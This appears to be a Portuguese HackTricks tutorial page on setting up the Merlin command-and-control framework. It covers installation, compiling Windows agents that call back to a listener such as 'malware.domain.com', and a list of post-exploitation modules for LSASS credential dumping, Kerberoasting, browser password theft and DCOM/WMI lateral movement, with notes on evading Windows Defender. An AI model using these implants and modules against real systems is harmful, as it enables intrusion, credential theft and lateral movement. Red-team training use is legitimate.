<details>

<summary><strong>Aprenda hacking em AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Instalação

## Instalar GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Instalação do Merlin
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Iniciar Servidor Merlin
```
go run cmd/merlinserver/main.go -i
```
# Agentes Merlin

Você pode [baixar agentes pré-compilados](https://github.com/Ne0nd0g/merlin/releases)

## Compilar Agentes

Vá para a pasta principal _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **Compilação manual de agentes**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# Módulos

**A má notícia é que cada módulo usado pelo Merlin é baixado da fonte (Github) e salvo no disco antes de ser usado. Tenha cuidado ao usar módulos bem conhecidos porque o Windows Defender vai pegar você!**


**SafetyKatz** --> Mimikatz Modificado. Despeja LSASS em arquivo e executa: sekurlsa::logonpasswords nesse arquivo\
**SharpDump** --> minidump para o ID do processo especificado (LSASS por padrão) (Diz que a extensão do arquivo final é .gz mas na verdade é .bin, mas é um arquivo gz)\
**SharpRoast** --> Kerberoast (não funciona)\
**SeatBelt** --> Testes de Segurança Local no CS (não funciona) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> Compila usando csc.exe /unsafe\
**Sharp-Up** --> Todos os testes em C# no powerup (funciona)\
**Inveigh** --> Ferramenta de spoofing e man-in-the-middle para PowerShellADIDNS/LLMNR/mDNS/NBNS (não funciona, precisa carregar: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> Personifica todos os usuários disponíveis e recupera um desafio-resposta para cada um (hash NTLM para cada usuário) (URL errada)\
**Invoke-PowerThIEf** --> Rouba formulários do IExplorer ou faz com que execute JS ou injeta uma DLL nesse processo (não funciona) (e o PS parece que também não funciona) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> Obtém senhas do navegador (funciona mas não imprime o diretório de saída)\
**dumpCredStore** --> API do Gerenciador de Credenciais Win32 (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> Detecta injeção clássica em processos em execução (Injeção Clássica (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (não funciona)\
**Get-OSTokenInformation** --> Obtém Informações de Token dos processos e threads em execução (Usuário, grupos, privilégios, proprietário... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> Executa um comando (em outro computador) via DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> Executa um comando em outro PC abusando de objetos COM do PowerPoint (ADDin)\
**Invoke-ExcelMacroPivot** --> Executa um comando em outro PC abusando do DCOM no Excel\
**Find-ComputersWithRemoteAccessPolicies** --> (não funciona) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> Despeja todas as partes mais interessantes da política de grupo e depois procura nelas coisas exploráveis. (obsoleto) Dê uma olhada no Grouper2, parece muito bom\
**Invoke-WMILM** --> WMI para movimentação lateral\
**Get-GPPPassword** --> Procura por groups.xml, scheduledtasks.xml, services.xml e datasources.xml e retorna senhas em texto claro (dentro do domínio)\
**Invoke-Mimikatz** --> Usa mimikatz (despejo padrão de credenciais)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> Verifica os privilégios dos usuários nos computadores\
**Find-PotentiallyCrackableAccounts** --> Recupera informações sobre contas de usuário associadas a SPN (Kerberoasting)\
**psgetsystem** --> obtém sistema

**Não verifiquei módulos de persistência**

# Resumo

Eu realmente gosto da sensação e do potencial da ferramenta.\
Espero que a ferramenta comece a baixar os módulos do servidor e integre algum tipo de evasão ao baixar scripts.


<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga** me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
